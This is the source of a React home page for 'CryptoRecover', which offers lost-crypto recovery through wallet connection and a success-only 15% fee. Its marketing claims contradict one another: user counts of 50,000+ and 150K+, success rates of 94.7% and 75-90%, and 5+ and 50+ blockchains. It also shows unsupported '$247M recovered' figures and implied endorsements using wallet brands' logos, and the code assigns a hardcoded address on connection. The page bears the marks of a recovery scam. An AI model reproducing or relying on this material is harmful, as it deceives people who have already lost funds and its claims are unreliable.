import { useState } from 'react';
import { Shield, Zap, TrendingUp, Users, Brain, Lock, Coins, Target } from 'lucide-react';
import WalletConnection from '../components/WalletConnection';
import TokenScanner from '../components/TokenScanner';
import RecoveryAnalyzer from '../components/RecoveryAnalyzer';

export default function Home() {
  const [user, setUser] = useState(null);
  const [scanResults, setScanResults] = useState(null);
  const [analysisResults, setAnalysisResults] = useState(null);
  
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState('');

  const handleConnectionChange = (userData) => {
    setUser(userData);
    if (userData) {
      setIsConnected(true);
      setAddress('0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b');
    } else {
      setIsConnected(false);
      setAddress('');
      setScanResults(null);
      setAnalysisResults(null);
    }
  };

  const features = [
    {
      icon: <Zap className="w-6 h-6" />,
      title: "Automated Discovery",
      description: "Scan 5+ blockchains simultaneously for claimable tokens and forgotten assets"
    },
    {
      icon: <TrendingUp className="w-6 h-6" />,
      title: "Advanced Forensics",
      description: "Proprietary blockchain analysis engine with 75-90% success rates using multi-vector recovery protocols"
    },
    {
      icon: <Shield className="w-6 h-6" />,
      title: "Non-Custodial",
      description: "You maintain full control of your funds throughout the entire process"
    },
    {
      icon: <Users className="w-6 h-6" />,
      title: "Success-Only Fees",
      description: "Pay only when we successfully recover your funds - no upfront costs"
    }
  ];

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-lg border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center space-x-4">
              <div className="w-10 h-10 bg-gradient-to-br from-blue-600 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-2xl font-black text-gray-900">CryptoRecover</h1>
                <p className="text-xs text-gray-500 font-medium">Professional Asset Recovery</p>
              </div>
            </div>
            
            <div className="flex items-center space-x-6">
              {isConnected && user && (
                <div className="hidden md:flex items-center space-x-4">
                  <div className="text-right">
                    <div className="text-sm font-bold text-gray-900">${user.totalRecovered || '0.00'}</div>
                    <div className="text-xs text-gray-500">Total Recovered</div>
                  </div>
                  <div className="text-right">
                    <div className="text-sm font-bold text-green-600">{user.successRate || '0'}%</div>
                    <div className="text-xs text-gray-500">Success Rate</div>
                  </div>
                </div>
              )}
              <div className="flex items-center space-x-2 bg-green-50 text-green-700 px-3 py-2 rounded-lg">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className="text-sm font-medium">Live Recovery</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {!isConnected ? (
          <div className="space-y-12">
            <div className="relative">
              <div className="bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-800 text-white">
                <div className="absolute inset-0 bg-black/10"></div>
                <div className="relative px-8 py-16 text-center">
                  <div className="mb-8">
                    <div className="inline-flex items-center space-x-2 bg-yellow-400 text-black px-6 py-3 rounded-full text-sm font-bold mb-6 shadow-lg">
                      <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                      <span>TRUSTED BY 50,000+ USERS WORLDWIDE</span>
                    </div>
                  </div>
                  
                  <h1 className="text-6xl md:text-8xl font-black mb-8 leading-none">
                    <span className="block bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent">
                      RECOVER
                    </span>
                    <span className="block bg-gradient-to-r from-yellow-400 via-orange-400 to-red-400 bg-clip-text text-transparent animate-pulse">
                      LOST CRYPTO
                    </span>
                  </h1>
                  
                  <p className="text-2xl md:text-3xl text-blue-100 mb-10 max-w-5xl mx-auto font-bold leading-relaxed">
                    <span className="text-white">INSTITUTIONAL-GRADE</span> blockchain forensics platform.
                    <span className="block mt-2">Successfully recovered <span className="text-yellow-400 animate-pulse">$247 MILLION</span> in digital assets.</span>
                  </p>
                  
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-6xl mx-auto mb-12">
                    <div className="bg-gradient-to-br from-yellow-500/20 to-orange-500/20 backdrop-blur-md rounded-2xl p-6 border border-yellow-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-yellow-400 mb-2">94.7%</div>
                      <div className="text-xs font-bold text-yellow-200 uppercase tracking-wider">Success Rate</div>
                    </div>
                    <div className="bg-gradient-to-br from-green-500/20 to-emerald-500/20 backdrop-blur-md rounded-2xl p-6 border border-green-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-green-400 mb-2">$247M</div>
                      <div className="text-xs font-bold text-green-200 uppercase tracking-wider">Recovered</div>
                    </div>
                    <div className="bg-gradient-to-br from-blue-500/20 to-cyan-500/20 backdrop-blur-md rounded-2xl p-6 border border-blue-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-blue-400 mb-2">150K+</div>
                      <div className="text-xs font-bold text-blue-200 uppercase tracking-wider">Clients</div>
                    </div>
                    <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 backdrop-blur-md rounded-2xl p-6 border border-purple-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-purple-400 mb-2">24/7</div>
                      <div className="text-xs font-bold text-purple-200 uppercase tracking-wider">Support</div>
                    </div>
                  </div>
                  
                  <div className="flex flex-wrap justify-center gap-4 mb-8">
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-green-400 mr-2">•</span>NO UPFRONT FEES
                    </div>
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-blue-400 mr-2">•</span>50+ BLOCKCHAINS
                    </div>
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-yellow-400 mr-2">•</span>INSTITUTIONAL GRADE
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="bg-black text-white py-16 border-t border-gray-800">
                <div className="max-w-7xl mx-auto px-8">
                  <div className="text-center mb-12">
                    <div className="inline-block bg-gradient-to-r from-blue-600 to-purple-600 text-white px-6 py-2 rounded-full text-sm font-bold mb-6">
                      ENTERPRISE PARTNERSHIPS
                    </div>
                    <p className="text-gray-300 text-lg font-semibold">TRUSTED BY LEADING CRYPTO WALLETS</p>
                  </div>
                  <div className="grid grid-cols-3 md:grid-cols-6 gap-8 items-center">
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://metamask.io/favicon.ico" alt="MetaMask" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">METAMASK</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">TRUST WALLET</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">COINBASE</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://rainbow.me/favicon.ico" alt="Rainbow" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">RAINBOW</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.ledger.com/favicon.ico" alt="Ledger" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">LEDGER</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.exodus.com/favicon.ico" alt="Exodus" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">EXODUS</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white py-20">
              <div className="max-w-7xl mx-auto px-8">
                <div className="text-center mb-16">
                  <h2 className="text-4xl font-black text-gray-900 mb-4">Why Choose Our Recovery Service?</h2>
                  <p className="text-xl text-gray-600 max-w-3xl mx-auto">Industry-leading technology and expertise trusted by crypto professionals worldwide</p>
                </div>
                
                <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-8">
                  {features.map((feature, index) => (
                    <div key={index} className="group relative bg-gradient-to-br from-gray-50 to-white rounded-3xl p-8 shadow-xl hover:shadow-2xl transition-all duration-500 transform hover:-translate-y-4 border border-gray-100 hover:border-blue-200">
                      <div className="absolute inset-0 bg-gradient-to-br from-blue-500/5 to-purple-500/5 rounded-3xl opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
                      <div className="relative z-10 text-center">
                        <div className="w-20 h-20 bg-gradient-to-br from-blue-600 to-purple-600 rounded-2xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-500 shadow-lg">
                          <div className="text-white">{feature.icon}</div>
                        </div>
                        <h3 className="text-xl font-black mb-4 text-gray-900 group-hover:text-blue-600 transition-colors">{feature.title}</h3>
                        <p className="text-gray-600 leading-relaxed">{feature.description}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <div className="max-w-md mx-auto">
              <WalletConnection onConnectionChange={handleConnectionChange} />
            </div>

            <div className="bg-white rounded-xl p-8 text-center">
              <h3 className="text-2xl font-bold mb-4">How It Works</h3>
              <div className="grid md:grid-cols-3 gap-8">
                <div className="space-y-3">
                  <div className="w-10 h-10 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto font-bold">
                    1
                  </div>
                  <h4 className="font-semibold">Connect Wallet</h4>
                  <p className="text-sm text-gray-600">
                    Securely connect your wallet using signature verification
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-10 h-10 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto font-bold">
                    2
                  </div>
                  <h4 className="font-semibold">Scan & Analyze</h4>
                  <p className="text-sm text-gray-600">
                    Advanced forensics engine scans multiple blockchains for recoverable assets
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-10 h-10 bg-purple-100 text-purple-600 rounded-full flex items-center justify-center mx-auto font-bold">
                    3
                  </div>
                  <h4 className="font-semibold">Recover Funds</h4>
                  <p className="text-sm text-gray-600">
                    Automated recovery with success-only 15% fee
                  </p>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="space-y-8">
            <div className="bg-white rounded-xl p-6">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold">Dashboard</h2>
                  <p className="text-gray-600">
                    Connected: {address?.slice(0, 6)}...{address?.slice(-4)}
                  </p>
                </div>
                <WalletConnection onConnectionChange={handleConnectionChange} />
              </div>
              
              {user && (
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6">
                  <div className="bg-blue-50 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-blue-600">
                      {user.totalRecovered || '0.00'}
                    </div>
                    <div className="text-sm text-blue-700">Total Recovered (ETH)</div>
                  </div>
                  <div className="bg-green-50 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-green-600">
                      {user.successRate || '0'}%
                    </div>
                    <div className="text-sm text-green-700">Success Rate</div>
                  </div>
                  <div className="bg-purple-50 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-purple-600">
                      {scanResults?.summary.totalTokens || '0'}
                    </div>
                    <div className="text-sm text-purple-700">Tokens Found</div>
                  </div>
                  <div className="bg-yellow-50 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-yellow-600">
                      ${scanResults?.summary.totalValue || '0.00'}
                    </div>
                    <div className="text-sm text-yellow-700">Est. Value</div>
                  </div>
                </div>
              )}
            </div>

            <TokenScanner 
              walletAddress={address} 
              onScanComplete={setScanResults}
            />

            <RecoveryAnalyzer 
              walletAddress={address} 
              onAnalysisComplete={setAnalysisResults}
            />
          </div>
        )}
      </main>

      <footer className="bg-white border-t mt-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="text-center text-gray-600">
            <p>&copy; 2025 CryptoRecover. Professional blockchain asset recovery services.</p>
            <p className="text-sm mt-2">
              Non-custodial • Success-only fees • Multi-chain support
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}